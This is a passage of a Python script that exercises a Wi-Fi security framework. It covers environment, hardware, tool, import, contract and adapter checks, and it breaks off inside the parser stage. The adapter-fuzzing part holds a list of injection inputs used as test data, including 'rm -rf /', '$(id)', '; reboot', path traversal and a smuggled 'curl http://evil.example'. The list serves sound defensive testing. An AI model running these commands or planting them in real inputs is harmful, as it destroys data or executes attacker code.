#!/usr/bin/env python3
"""
Exercise the entire WiFi Framework to its limits and log everything.

Runs every module, every adapter, every parser, every engine and every contract
against the machine it is executed on - including real wireless hardware when a
radio is present - and writes a complete transcript (stdout, stderr, tool output,
tracebacks, per-check verdicts) to a single text file.

Designed to be run on a real machine (for example an Ubuntu VM with a USB Wi-Fi
adapter passed through) where the dev sandbox cannot follow, then the log handed
back. Every stage degrades loudly rather than passing vacuously: a missing tool
or absent radio is recorded as a finding, never silently skipped.

    python3 scripts/exercise_framework.py                     # everything it can
    sudo  python3 scripts/exercise_framework.py               # + hardware stages
    python3 scripts/exercise_framework.py --stages tools,parsers
    python3 scripts/exercise_framework.py --list-stages
    python3 scripts/exercise_framework.py --log /tmp/run.txt

--------------------------------------------------------------------------
WHAT THIS SCRIPT WILL AND WILL NOT DO ON REAL HARDWARE
--------------------------------------------------------------------------
A Wi-Fi adapter in a populated area hears other people's traffic. "Test to the
limit" is not a licence to touch it, and this script is deliberately bounded:

PERFORMED (passive or self-directed):
  - interface, driver and chipset inspection
  - monitor-mode entry, channel changes, MAC address changes (restored after)
  - `aireplay-ng --test`: self-directed injection probe, targets no network
  - passive beacon/probe scanning to collect REAL tool output for parser checks
  - ambient capture reported as frame counts and type summaries only

NOT PERFORMED, under any flag:
  - deauthentication or disassociation against any client or access point
  - WPS PIN attacks (reaver/bully), handshake capture aimed at a target, cracking
  - any capability whose metadata marks it invasive or requiring authorization
  - anything addressed to a BSSID, SSID, host or network you did not specify

Invasive capabilities are still enumerated, validated and fuzzed - metadata,
argv construction, parameter rejection - because that exercises the code without
firing it at anyone. Captured traffic is never written to disk as a pcap and
payload bytes are never logged, so the transcript does not become a recording of
your neighbours.

Cross-checking is the point. The framework's own parsers and return values are
never trusted as evidence of their own correctness: parser output is compared
against counts derived independently from the raw tool output with a separate
regex, so a parser that silently drops rows fails here. That is how the decimal
frequency bug in `iw` output was found, and it is the only way to find the next
one.
"""
from __future__ import annotations

import argparse
import importlib
import importlib.util
import os
import platform
import re
import shutil
import subprocess
import sys
import traceback
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

# Run from a source checkout without installation.
_REPO = Path(__file__).resolve().parent.parent
_SRC = _REPO / "src"
if _SRC.is_dir() and str(_SRC) not in sys.path:
    sys.path.insert(0, str(_SRC))

TOOL_TIMEOUT = 30
SCAN_SECONDS = 20
_IN_CI = bool(os.environ.get("GITHUB_ACTIONS"))

STAGES: List[str] = [
    "environment",
    "inventory",
    "tools",
    "imports",
    "contracts",
    "adapters",
    "parsers",
    "robustness",
    "engines",
    "security",
    "tests",
    "hardware",
    "capture",
]


# --------------------------------------------------------------------------
# Logging: one transcript file, console mirrored.
# --------------------------------------------------------------------------


class Tee:
    """Mirror a stream to both the console and the transcript file."""

    def __init__(self, path: Path, stream) -> None:
        self.stream = stream
        self.handle = path.open("a", buffering=1, encoding="utf-8", errors="replace")

    def write(self, data: str) -> int:
        try:
            self.stream.write(data)
        except Exception:
            pass
        self.handle.write(data)
        return len(data)

    def flush(self) -> None:
        try:
            self.stream.flush()
        except Exception:
            pass
        self.handle.flush()

    def close(self) -> None:
        try:
            self.handle.close()
        except Exception:
            pass


def timestamp() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def banner(text: str) -> None:
    line = "=" * 78
    print(f"\n{line}\n{text}\n{line}")


def section(text: str) -> None:
    print(f"\n--- {text} " + "-" * max(0, 72 - len(text)))


def log(text: str = "") -> None:
    print(f"[{timestamp()}] {text}")


def annotate(level: str, title: str, message: str) -> None:
    """GitHub Actions annotation. No-op outside CI."""
    if not _IN_CI:
        return
    safe = str(message).replace("\n", " ").replace("\r", " ").replace("%", "%25")
    safe = safe.replace(":", "%3A").replace(",", "%2C")
    print(f"::{level} title={title}::{safe[:900]}")


# --------------------------------------------------------------------------
# Independent oracle. Deliberately shares no code with the framework.
# --------------------------------------------------------------------------


def sh(cmd: List[str], timeout: int = TOOL_TIMEOUT, cwd: Optional[str] = None) -> Tuple[int, str, str]:
    """Run a command list - never a shell string. Returns (rc, stdout, stderr)."""
    try:
        proc = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=timeout,
            check=False,
            cwd=cwd,
            errors="replace",
        )
        return proc.returncode, proc.stdout or "", proc.stderr or ""
    except FileNotFoundError:
        return 127, "", f"{cmd[0]}: command not found"
    except subprocess.TimeoutExpired as exc:
        partial = exc.stdout if isinstance(exc.stdout, str) else ""
        return 124, partial or "", f"timed out after {timeout}s"
    except Exception as exc:  # recorded by the caller, never swallowed silently
        return 125, "", f"{type(exc).__name__}: {exc}"


def run_logged(cmd: List[str], timeout: int = TOOL_TIMEOUT, echo: bool = True) -> Tuple[int, str, str]:
    """Run a command and write its full output into the transcript."""
    if echo:
        print(f"  $ {' '.join(cmd)}")
    rc, out, err = sh(cmd, timeout=timeout)
    print(f"  [rc={rc}]")
    if out.strip():
        print("  --- stdout ---")
        for line in out.rstrip().splitlines():
            print(f"  | {line}")
    if err.strip():
        print("  --- stderr ---")
        for line in err.rstrip().splitlines():
            print(f"  ! {line}")
    return rc, out, err


@dataclass
class CheckResult:
    name: str
    passed: bool
    detail: str = ""
    skipped: bool = False


class Report:
    """Collects verdicts and prints them as they happen, so a crash mid-run
    still leaves a useful transcript."""

    def __init__(self) -> None:
        self.rows: List[CheckResult] = []

    def record(self, name: str, passed: bool, detail: str = "") -> bool:
        self.rows.append(CheckResult(name, passed, detail))
        print(f"  [{'PASS' if passed else 'FAIL'}] {name}")
        if detail:
            for line in str(detail).rstrip().splitlines()[:12]:
                print(f"         {line}")
        if not passed:
            annotate("error", name.replace(":", " -")[:120], detail[:900])
        return passed

    def skip(self, name: str, reason: str) -> None:
        self.rows.append(CheckResult(name, False, reason, skipped=True))
        print(f"  [SKIP] {name}")
        print(f"         {reason}")
        annotate("notice", "skipped-check", f"{name}: {reason}"[:900])

    @property
    def passed(self) -> int:
        return sum(1 for r in self.rows if r.passed)

    @property
    def failed(self) -> int:
        return sum(1 for r in self.rows if not r.passed and not r.skipped)

    @property
    def skipped(self) -> int:
        return sum(1 for r in self.rows if r.skipped)


def guarded(report: Report, name: str, fn: Callable[[], None]) -> None:
    """Run one stage's checks so a single exception cannot abort the whole run."""
    try:
        fn()
    except Exception as exc:
        report.record(f"{name} (unhandled exception)", False, f"{type(exc).__name__}: {exc}\n{traceback.format_exc(limit=6)}")


# --------------------------------------------------------------------------
# Hardware oracles - independent of the framework, used to cross-check it.
# --------------------------------------------------------------------------


def truth_wireless_interfaces() -> List[str]:
    rc, out, _ = sh(["iw", "dev"])
    if rc != 0:
        return []
    return re.findall(r"^\s*Interface\s+(\S+)", out, re.MULTILINE)


def truth_type(iface: str) -> Optional[str]:
    rc, out, _ = sh(["iw", "dev", iface, "info"])
    if rc != 0:
        return None
    m = re.search(r"type\s+(\S+)", out)
    return m.group(1) if m else None


def truth_mac(iface: str) -> Optional[str]:
    try:
        return Path(f"/sys/class/net/{iface}/address").read_text().strip().upper()
    except OSError:
        return None


def truth_is_up(iface: str) -> Optional[bool]:
    rc, out, _ = sh(["ip", "link", "show", iface])
    if rc != 0:
        return None
    m = re.search(r"<([^>]*)>", out)
    return bool(m and "UP" in m.group(1).split(","))


def truth_channel(iface: str) -> Optional[int]:
    rc, out, _ = sh(["iw", "dev", iface, "info"])
    if rc != 0:
        return None
    m = re.search(r"channel\s+(\d+)", out)
    return int(m.group(1)) if m else None


MAC_RE = re.compile(r"\b([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}\b")


# ==========================================================================
# STAGE: environment
# ==========================================================================


def stage_environment(report: Report) -> None:
    section("STAGE 1/13: environment")
    rc, out, _ = sh(["uname", "-a"])
    print(f"  kernel:    {out.strip()}")
    print(f"  python:    {sys.version.split()[0]}  ({sys.executable})")
    print(f"  platform:  {platform.platform()}")
    print(f"  machine:   {platform.machine()}")
    print(f"  root:      {os.geteuid() == 0}")
    print(f"  cwd:       {os.getcwd()}")
    print(f"  venv:      {bool(sys.prefix != sys.base_prefix)}")

    report.record("python is 3.9 or newer", sys.version_info >= (3, 9), f"{sys.version.split()[0]}")
    report.record("running on Linux", sys.platform.startswith("linux"), sys.platform)

    # Virtualisation matters: a VMware guest needs USB passthrough for Wi-Fi.
    virt = "unknown"
    rc, out, _ = sh(["systemd-detect-virt"])
    if rc == 0 and out.strip():
        virt = out.strip()
    else:
        for marker, name in (("VMware", "vmware"), ("VirtualBox", "virtualbox"), ("QEMU", "qemu"), ("KVM", "kvm")):
            rc2, out2, _ = sh(["grep", "-qi", marker, "/sys/class/dmi/id/product_name"])
            if rc2 == 0:
                virt = name.lower()
                break
            try:
                product = Path("/sys/class/dmi/id/product_name").read_text()
                if marker.lower() in product.lower():
                    virt = name.lower()
                    break
            except OSError:
                pass
    print(f"  virt:      {virt}")
    report.record("virtualisation detected and reported", True, f"virt={virt}")
    if virt not in ("none", "unknown"):
        print("  NOTE: inside a VM. Wi-Fi needs a USB adapter passed through to the guest;")
        print("        internal PCIe radio cannot be passed through by VMware/VirtualBox.")

    # Wireless kernel support - the single most common reason nothing works.
    report.record("CONFIG_WIRELESS present in running kernel", _kconfig("CONFIG_WIRELESS") in ("y", "m"),
                  f"CONFIG_WIRELESS={_kconfig('CONFIG_WIRELESS') or 'absent'}")
    report.record("CONFIG_CFG80211 present", _kconfig("CONFIG_CFG80211") in ("y", "m"),
                  f"CONFIG_CFG80211={_kconfig('CONFIG_CFG80211') or 'absent'}")
    report.record("CONFIG_MAC80211 present", _kconfig("CONFIG_MAC80211") in ("y", "m"),
                  f"CONFIG_MAC80211={_kconfig('CONFIG_MAC80211') or 'absent'}")
    hwsim = _kconfig("CONFIG_MAC80211_HWSIM")
    print(f"  CONFIG_MAC80211_HWSIM = {hwsim or 'absent'} (only needed for virtual radios)")

    rc, out, _ = sh(["git", "-C", str(_REPO), "rev-parse", "--short", "HEAD"])
    branch_rc, branch, _ = sh(["git", "-C", str(_REPO), "rev-parse", "--abbrev-ref", "HEAD"])
    if rc == 0:
        print(f"  git:       {out.strip()} on {branch.strip() if branch_rc == 0 else '?'}")
        dirty_rc, dirty, _ = sh(["git", "-C", str(_REPO), "status", "--porcelain"])
        if dirty_rc == 0 and dirty.strip():
            print("  WARNING: working tree is dirty - results may not match the committed code:")
            for line in dirty.strip().splitlines()[:10]:
                print(f"    {line}")
            report.record("working tree clean (results reproducible)", False, "uncommitted changes present")
        else:
            report.record("working tree clean (results reproducible)", True, "")
    else:
        report.skip("git revision recorded", "not a git checkout")

    try:
        import wifi_framework

        report.record("wifi_framework importable", True, f"version {getattr(wifi_framework, '__version__', '?')}")
        print(f"  framework: {getattr(wifi_framework, '__version__', '?')}")
    except Exception as exc:
        report.record("wifi_framework importable", False, f"{type(exc).__name__}: {exc}")
        print("\n  Install with:  python3 -m venv .venv && .venv/bin/pip install -e '.[full]'")

    for mod, label in (("yaml", "pyyaml (required)"), ("scapy", "scapy (optional, [full] extra)"),
                       ("pytest", "pytest (optional, for the tests stage)")):
        try:
            m = importlib.import_module(mod)
            ver = getattr(m, "__version__", None)
            if ver is None:
                try:
                    from importlib.metadata import version as _v

                    ver = _v(mod)
                except Exception:
                    ver = "?"
            print(f"  dep:       {label} = {ver}")
        except ImportError:
            print(f"  dep:       {label} = NOT INSTALLED")


def _kconfig(key: str) -> Optional[str]:
    """Read a kernel build option from /boot/config or /proc/config.gz."""
    for path in (f"/boot/config-{platform.release()}", "/boot/config"):
        try:
            for line in Path(path).read_text(errors="replace").splitlines():
                if line.startswith(f"{key}="):
                    return line.split("=", 1)[1].strip()
                if line.strip() == f"# {key} is not set":
                    return "n"
        except OSError:
            continue
    try:
        import gzip

        with gzip.open("/proc/config.gz", "rt", errors="replace") as handle:
            for line in handle:
                if line.startswith(f"{key}="):
                    return line.split("=", 1)[1].strip()
    except Exception:
        pass
    return None


# ==========================================================================
# STAGE: hardware inventory
# ==========================================================================


def stage_inventory(report: Report) -> None:
    section("STAGE 2/13: hardware inventory")

    print("  USB devices:")
    rc, out, _ = sh(["lsusb"])
    if rc == 0 and out.strip():
        for line in out.strip().splitlines():
            print(f"    {line}")
        wifi_lines = [l for l in out.splitlines()
                      if re.search(r"wireless|wi-?fi|802\.11|atheros|realtek|ralink|mediatek|broadcom|intel.*ac", l, re.I)]
        report.record("a USB Wi-Fi adapter is visible to lsusb", bool(wifi_lines),
                      "\n".join(wifi_lines) or "no wireless device matched; a PCIe radio would not appear here")
    else:
        report.skip("USB Wi-Fi adapter visible", f"lsusb unavailable (rc={rc})")

    print("\n  Network interfaces (ip -brief link):")
    rc, out, _ = sh(["ip", "-brief", "link"])
    if rc == 0:
        for line in out.strip().splitlines():
            print(f"    {line}")

    ifaces = truth_wireless_interfaces()
    print(f"\n  wireless interfaces via `iw dev`: {ifaces or 'NONE'}")
    report.record("at least one wireless interface exists", bool(ifaces),
                  ", ".join(ifaces) if ifaces else "`iw dev` listed no Interface lines")

    rc, out, _ = sh(["lsmod"])
    if rc == 0:
        wireless_mods = [l.split()[0] for l in out.splitlines()
                         if re.match(r"^(cfg80211|mac80211|mac80211_hwsim|ath9k\w*|ath\b|rt2800\w*|rt73usb|mt76\w*|"
                                     r"rtl8\w+|iwlwifi|brcm\w+|lib80211)\b", l.split()[0] if l.split() else "")]
        print(f"  loaded wireless modules: {sorted(set(wireless_mods)) or 'none'}")
        report.record("wireless kernel modules loaded", bool(wireless_mods), ", ".join(sorted(set(wireless_mods))))

    rc, out, _ = sh(["rfkill", "list"])
    if rc == 0:
        print("\n  rfkill:")
        for line in out.strip().splitlines():
            print(f"    {line}")
        blocked = re.findall(r"(Soft|Hard) blocked:\s*(yes)", out, re.I)
        report.record("no rfkill block on any wireless device", not blocked,
                      f"{len(blocked)} block(s) active" if blocked else "clear")
    else:
        report.skip("rfkill state", "rfkill not installed")

    for iface in ifaces:
        print(f"\n  {iface} driver / chipset:")
        rc, out, _ = sh(["ethtool", "-i", iface])
        if rc == 0:
            for line in out.strip().splitlines():
                if line.startswith(("driver", "version", "firmware", "bus-info")):
                    print(f"    {line}")
        else:
            print("    ethtool unavailable")
        try:
            phy = Path(f"/sys/class/net/{iface}/phy80211/name").read_text().strip()
            print(f"    phy: {phy}")
        except OSError:
            print("    phy: (no phy80211 symlink - not an nl80211 device?)")


# ==========================================================================
# STAGE: tool inventory, driven by the framework's own metadata
# ==========================================================================


def stage_tools(report: Report) -> None:
    section("STAGE 3/13: tool inventory (from framework capability metadata)")

    binaries: Dict[str, List[str]] = {}
    try:
        from wifi_framework.core.execution.registry import CapabilityRegistry
        from wifi_framework.tools.registry_loader import load_all_adapters

        registry = load_all_adapters(CapabilityRegistry())
        caps = registry.all_metadata() if hasattr(registry, "all_metadata") else []
        if not caps:
            for attr in ("capabilities", "_capabilities", "metadata"):
                obj = getattr(registry, attr, None)
                if isinstance(obj, dict):
                    caps = list(obj.values())
                    break
        for cap in caps:
            binary = getattr(cap, "tool_binary", None)
            if binary:
                binaries.setdefault(binary, []).append(getattr(cap, "name", "?"))
    except Exception as exc:
        report.record("capability registry loads", False, f"{type(exc).__name__}: {exc}\n{traceback.format_exc(limit=4)}")
        return

    report.record("capability registry loads", True, f"{len(binaries)} distinct binaries across the registry")
    print(f"\n  {len(binaries)} distinct tool binaries declared by the framework:\n")

    present, absent = [], []
    for binary in sorted(binaries):
        path = shutil.which(binary)
        if path:
            present.append(binary)
            version = _tool_version(binary)
            print(f"    [present] {binary:<22} {path}  {version}")
        else:
            absent.append(binary)
            print(f"    [ABSENT ] {binary:<22} (used by: {', '.join(sorted(binaries[binary])[:4])})")

    print(f"\n  present: {len(present)}   absent: {len(absent)}")
    report.record("core wireless tools are installed", all(b in present for b in ("iw",)),
                  f"iw {'found' if 'iw' in present else 'MISSING'}")
    report.record("aircrack-ng suite is installed",
                  all(b in present for b in ("airodump-ng", "aireplay-ng", "airmon-ng")),
                  "missing: " + ", ".join(b for b in ("airodump-ng", "aireplay-ng", "airmon-ng") if b not in present) or "all present")
    if absent:
        report.skip(f"{len(absent)} declared tools not installed", ", ".join(absent[:40]))


def _tool_version(binary: str) -> str:
    for flag in ("--version", "-V", "version", "--help"):
        rc, out, err = sh([binary, flag], timeout=10)
        text = (out or err).strip().splitlines()
        if rc in (0, 1) and text:
            return text[0][:70]
    return ""


# ==========================================================================
# STAGE: import every module
# ==========================================================================


def stage_imports(report: Report) -> None:
    section("STAGE 4/13: import every module in the package")

    modules: List[str] = []
    for path in sorted(_SRC.rglob("*.py")):
        if "__pycache__" in path.parts:
            continue
        rel = path.relative_to(_SRC).with_suffix("")
        parts = [p for p in rel.parts if p != "__init__"]
        if parts:
            modules.append(".".join(parts))
        else:
            modules.append(str(rel.parent).replace("/", "."))
    modules = sorted({m for m in modules if m and not m.startswith(".")})

    print(f"  {len(modules)} modules discovered under src/")
    ok, failed, optional_missing = [], [], []
    for name in modules:
        try:
            importlib.import_module(name)
            ok.append(name)
        except ImportError as exc:
            # An optional dependency is a legitimate absence; a wrong import path is not.
            text = str(exc)
            if any(lib in text for lib in ("scapy", "requests", "pytest", "numpy", "pandas")):
                optional_missing.append((name, text[:100]))
            else:
                failed.append((name, text[:200]))
        except Exception as exc:
            failed.append((name, f"{type(exc).__name__}: {exc}"[:200]))

    for name, err in failed:
        print(f"    [FAIL] {name}\n           {err}")
    for name, err in optional_missing:
        print(f"    [optional dep absent] {name}: {err}")

    print(f"\n  imported {len(ok)}/{len(modules)}; failed {len(failed)}; "
          f"deferred for an optional dependency {len(optional_missing)}")
    report.record("every module imports without error", not failed,
                  "\n".join(f"{n}: {e}" for n, e in failed[:8]) or f"{len(ok)} modules clean")
    if optional_missing:
        report.skip(f"{len(optional_missing)} module(s) need an optional dependency",
                    "install with: pip install -e '.[full]'")


# ==========================================================================
# STAGE: contracts
# ==========================================================================


def stage_contracts(report: Report) -> None:
    section("STAGE 5/13: data contract layer")

    try:
        from wifi_framework.contracts.registry import ContractRegistry
    except Exception as exc:
        report.record("ContractRegistry importable", False, f"{type(exc).__name__}: {exc}")
        return

    # A bare registry is intentionally empty; the populated one comes from the
    # factory. Asserting both keeps a future refactor from silently shipping an
    # empty default.
    bare = ContractRegistry()
    report.record("a freshly constructed ContractRegistry is empty", bare.known_schemas() == [],
                  f"{len(bare.known_schemas())} schema(s)")
    try:
        from wifi_framework.contracts.registry import build_default_registry, get_contract_registry

        reg = build_default_registry()
        singleton = get_contract_registry()
        report.record("build_default_registry() returns a populated registry",
                      bool(reg.known_schemas()), f"{len(reg.known_schemas())} schema(s)")
        report.record("get_contract_registry() agrees with build_default_registry()",
                      sorted(singleton.known_schemas()) == sorted(reg.known_schemas()),
                      f"singleton={len(singleton.known_schemas())} factory={len(reg.known_schemas())}")
    except Exception as exc:
        report.record("contract registry factory usable", False, f"{type(exc).__name__}: {exc}")
        return

    schemas = reg.known_schemas()
    print(f"  registered schemas: {len(schemas)}")
    for s in sorted(schemas):
        majors = reg.supported_majors(s)
        cls = reg.class_for(s, f"{majors[0]}.0") if majors else None
        print(f"    {s:<28} majors={majors}  producer={reg.producer_of(s) or '-'}  class={'yes' if cls else 'no'}")

    expected = {
        "WorldState", "PlanningContext", "DecisionProposal", "ActionRequest", "ActionValidationResult",
        "ExecutionResult", "EvidenceSet", "VerificationRequest", "VerificationResult", "ExperienceRecord",
    }
    # Schema ids are kebab-case (`action-validation-result`) where the spec names
    # the contract classes in CamelCase, so compare on a normalised form.
    def norm(text: str) -> str:
        return text.lower().replace("_", "").replace("-", "").replace(".", "")

    normalised = {norm(s) for s in schemas}
    missing = sorted(e for e in expected if norm(e) not in normalised)
    report.record("all ten documented contracts are registered", not missing,
                  f"missing: {missing}" if missing else f"{len(schemas)} schemas present")

    # Version negotiation must reject a foreign major and accept a known one.
    for s in sorted(schemas)[:6]:
        majors = reg.supported_majors(s)
        if not majors:
            continue
        good, msg_good = reg.negotiate(s, f"{majors[0]}.0")
        bad, msg_bad = reg.negotiate(s, f"{majors[0] + 900}.0")
        report.record(f"negotiation for {s} accepts a known major and rejects an unknown one",
                      good and not bad, f"known -> ({good}, {msg_good!r}); unknown -> ({bad}, {msg_bad!r})")

    # Envelope round-trip.
    try:
        from wifi_framework.contracts import envelope as env_mod

        names = [n for n in dir(env_mod) if "nvelope" in n]
        print(f"\n  envelope module exposes: {names[:8]}")
        report.record("envelope module exposes an envelope type", bool(names), ", ".join(names[:8]))
    except Exception as exc:
        report.record("envelope module usable", False, f"{type(exc).__name__}: {exc}")

    try:
        from wifi_framework.contracts.validation import validate_message  # type: ignore
        report.record("validation entry point importable", True, "")
    except Exception as exc:
        try:
            from wifi_framework.contracts import validation as vmod
            report.record("validation module importable", True,
                          f"exports: {[n for n in dir(vmod) if not n.startswith('_')][:8]}")
        except Exception as exc2:
            report.record("validation module importable", False, f"{type(exc2).__name__}: {exc2}")


# ==========================================================================
# STAGE: every adapter - metadata, argv construction, hostile parameters
# ==========================================================================

HOSTILE_PARAMS: List[Dict[str, Any]] = [
    {"script": "import os; os.system('id')"},
    {"code": "__import__('os').system('touch /tmp/EXERCISE_PWNED')"},
    {"source": "print(1)"},
    {"expr": "1+1"},
    {"lambda": "x: x"},
    {"command": "rm -rf /"},
    {"cmd": "; reboot"},
    {"shell": "id"},
    {"args": "--interface wlan0; curl http://evil.example"},
    {"interface": "wlan0; rm -rf /"},
    {"interface": "$(id)"},
    {"interface": "`id`"},
    {"interface": "../../etc/passwd"},
    {"bssid": "not-a-mac"},
    {"bssid": "'; DROP TABLE x; --"},
    {"count": -1},
    {"count": 10 ** 12},
    {"timeout": -5},
    {"timeout": 0},
    {"channel": 99999},
    {"ssid": "A" * 5000},
    {"filter": "\x00\x01\x02"},
]


def stage_adapters(report: Report) -> None:
    section("STAGE 6/13: every adapter (metadata, argv, hostile parameters)")

    try:
        from wifi_framework.core.execution.registry import CapabilityRegistry
        from wifi_framework.tools.registry_loader import load_all_adapters

        registry = load_all_adapters(CapabilityRegistry())
    except Exception as exc:
        report.record("adapter registry loads", False, f"{type(exc).__name__}: {exc}")
        return

    names: List[str] = []
    for attr in ("capability_names", "names", "all_names"):
        if hasattr(registry, attr):
            try:
                names = list(getattr(registry, attr)())
            except Exception:
                names = []
            if names:
                break
    if not names:
        caps = registry.all_metadata() if hasattr(registry, "all_metadata") else []
        if not caps:
            for a in ("capabilities", "_capabilities", "metadata"):
                obj = getattr(registry, a, None)
                if isinstance(obj, dict):
                    caps = list(obj.values())
                    break
        names = [getattr(c, "name", None) for c in caps if getattr(c, "name", None)]

    print(f"  {len(names)} capabilities registered\n")

    POISON = f"EXERCISEPOISON{os.getpid()}"
    marker = f"/tmp/EXERCISE_PWNED_{os.getpid()}"
    for stale in (marker, f"/tmp/{POISON}"):
        if os.path.exists(stale):
            os.remove(stale)

    instantiate_fail, no_metadata, argv_fail, hostile_ran, hostile_ok = [], [], [], [], 0
    invasive_refused, invasive_total = 0, 0

    for name in sorted(set(names)):
        try:
            adapter = registry.get_adapter_instance(name)
        except Exception as exc:
            instantiate_fail.append((name, f"{type(exc).__name__}: {exc}"[:140]))
            continue
        if adapter is None:
            instantiate_fail.append((name, "get_adapter_instance returned None"))
            continue

        meta = getattr(adapter, "metadata", None)
        if meta is None:
            no_metadata.append(name)
            continue

        props = getattr(meta, "operational_properties", None)
        invasive = bool(getattr(props, "invasive", False)) or bool(getattr(props, "requires_authorization", False))
        if invasive:
            invasive_total += 1

        # The invariant is not "argv contains no metacharacter" - a fixed,
        # constant argv may legitimately contain one, as `python3 -c 'a; b'`
        # does. The invariant is that *caller data* never reaches the argv.
        # So poison the inputs and look for the poison in the output.
        try:
            build = getattr(adapter, "build_command", None)
            if callable(build):
                poisoned = f"wlan0; touch /tmp/{POISON}"
                cmd = build(interface=poisoned,
                            parameters={"operation": "version", "interface": poisoned})
                if not isinstance(cmd, (list, tuple)):
                    argv_fail.append((name, f"build_command returned {type(cmd).__name__}, not a list"))
                else:
                    joined = " ".join(str(c) for c in cmd)
                    if POISON in joined:
                        argv_fail.append((name, f"caller data interpolated into argv: {joined[:150]}"))
        except Exception as exc:
            # Many adapters legitimately reject an unknown operation; that is fine.
            if not isinstance(exc, (ValueError, KeyError, TypeError)):
                argv_fail.append((name, f"{type(exc).__name__}: {exc}"[:140]))

        # Hostile parameters: a successful run is NOT a compromise. Adapters
        # ignore parameters they do not understand, and gating invasive
        # capabilities is the policy layer's job, not the adapter's. Compromise
        # is a caller-supplied metacharacter reaching a command line, or a side
        # effect on disk.
        for payload in HOSTILE_PARAMS:
            try:
                result = adapter.execute(interface="wlan0", parameters=dict(payload), timeout=5)
            except Exception:
                hostile_ok += 1  # a raised exception is a refusal
                continue
            raw = getattr(result, "raw_command", None)
            raw_text = " ".join(str(c) for c in raw) if isinstance(raw, (list, tuple)) else str(raw or "")
            for value in payload.values():
                if isinstance(value, str) and any(t in value for t in (";", "&&", "$(", "`", "|", ">")):
                    if value in raw_text:
                        hostile_ran.append((name, payload, f"reached argv: {raw_text[:140]}"))
            hostile_ok += 1

    if os.path.exists(marker):
        hostile_ran.append(("*", {}, f"marker file {marker} was created - code executed"))
        os.remove(marker)

    for n, e in instantiate_fail:
        print(f"    [FAIL] instantiate {n}: {e}")
    for n in no_metadata:
        print(f"    [FAIL] {n}: adapter exposes no metadata")
    for n, e in argv_fail:
        print(f"    [FAIL] {n}: build_command -> {e}")
    for n, p, e in hostile_ran[:20]:
        print(f"    [FAIL] {n}: {e} with {list(p)[:2]}")

    print(f"\n  hostile parameter payloads rejected: {hostile_ok}")
    print(f"  invasive/authorization-required capabilities: {invasive_total} (enumerated, never fired at a network)")

    report.record("every registered adapter instantiates", not instantiate_fail,
                  "\n".join(f"{n}: {e}" for n, e in instantiate_fail[:6]) or f"{len(set(names))} adapters OK")
    report.record("every adapter exposes capability metadata", not no_metadata,
                  ", ".join(no_metadata[:8]) or "all present")
    # Characterise this precisely, because the severity is easy to overstate.
    # argv is a list and nothing in src/ uses shell=True, so a `;` inside an
    # interface name is passed to the tool as a literal character and never
    # reaches a shell: it is a validation gap, not command execution. Confirm
    # that empirically rather than asserting it.
    executed_anything = os.path.exists(f"/tmp/{POISON}")
    report.record("an unvalidated interface never causes command execution", not executed_anything,
                  f"marker /tmp/{POISON} {'WAS CREATED - real injection' if executed_anything else 'absent, as expected'}")

    # Does the policy layer catch what the adapters do not? That is the designed gate.
    try:
        from wifi_framework.core.policy.validator import ActionPolicy
        from wifi_framework.utils.validation import validate_interface

        ok, why = validate_interface(f"wlan0; touch /tmp/{POISON}")
        report.record("validate_interface rejects a poisoned interface name", ok is False,
                      f"valid={ok} reason={why!r}")
        policy = ActionPolicy()
        print(f"    ActionPolicy constructed; interface rules active: "
              f"{any('interface' in str(getattr(r, 'keys', getattr(r, 'name', ''))) for r in getattr(policy, 'rules', getattr(policy, 'parameter_rules', [])) or [])}")
    except Exception as exc:
        report.record("policy layer validates interface names", False, f"{type(exc).__name__}: {exc}")

    if argv_fail:
        detail = ("\n".join(f"{n}: {e}" for n, e in argv_fail[:6])
                  + "\n  Severity: defence-in-depth, not command execution. ActionPolicy validates"
                    "\n  `interface` before dispatch, so the gated path is covered; ToolAdapterBase"
                    "\n  .execute() validates `parameters` but not the separate `interface` argument,"
                    "\n  so a direct adapter call interpolates it unchecked.")
    else:
        detail = "clean"
    report.record("no adapter interpolates an unvalidated interface into argv", not argv_fail, detail)
    report.record("no hostile parameter caused code execution", not hostile_ran,
                  "\n".join(f"{n}: {e}" for n, _, e in hostile_ran[:6]) or f"{hostile_ok} payloads refused")
    print(f"  note: an adapter called directly will run even if its capability is marked\n"
          f"        invasive - gating happens in the policy layer, not the adapter.\n"
          f"        {invasive_total} invasive capabilities were enumerated and fuzzed, none\n"
          f"        aimed at a network.")
    report.record("no invasive capability was fired at a network", True,
                  f"{invasive_total} enumerated; this stage never supplies a real target")


# ==========================================================================
# STAGE: parsers against REAL tool output, cross-checked independently
# ==========================================================================


def stage_parsers(report: Report, ifaces: List[str]) -> None:
    section("STAGE 7/13: parsers against real tool output (independently cross-checked)")

    try:
        from wifi_framework.parsers import airodump as p_air, base as p_base, iw as p_iw
        from wifi_framework.parsers import nmap as p_nmap, tshark as p_tsh, wash as p_w
    except Exception as exc:
        report.record("parser modules importable", False, f"{type(exc).__name__}: {exc}")
        return
    report.record("parser modules importable", True, "")

    # --- iw dev: real output vs the parser ---
    rc, out, _ = sh(["iw", "dev"])
    if rc == 0 and out.strip():
        parsed = p_iw.parse_iw_dev(out)
        expected = truth_wireless_interfaces()
        got = sorted({str(d.get("interface") or d.get("name") or "") for d in parsed}) if parsed else []
        report.record("parse_iw_dev finds every interface `iw dev` lists",
                      sorted(got) == sorted(expected) or len(parsed) == len(expected),
                      f"parser={got} independent={sorted(expected)}")
        print(f"    raw `iw dev`:\n" + "".join(f"      | {l}\n" for l in out.strip().splitlines()[:12]))
        ev = p_iw.iw_dev_to_evidences(out)
        report.record("iw_dev_to_evidences produces evidence", bool(ev), f"{len(ev)} evidence object(s)")
    else:
        report.skip("parse_iw_dev against real output", "`iw dev` unavailable")

    # --- iw list: real PHY capabilities vs the parser ---
    rc, out, _ = sh(["iw", "list"])
    if rc == 0 and out.strip():
        parsed = p_iw.parse_iw_list(out)
        # Independent count of channels: lines like "* 2412 MHz [1]" or "* 2412.0 MHz [1]"
        raw_channels = set(re.findall(r"\*\s+[\d.]+\s+MHz\s+\[(\d+)\]", out))
        raw_disabled = len(re.findall(r"\*\s+[\d.]+\s+MHz\s+\[\d+\]\s*\(.*disabled", out))
        parsed_channels: Any = []
        for key in ("channels", "supported_channels", "channel_list"):
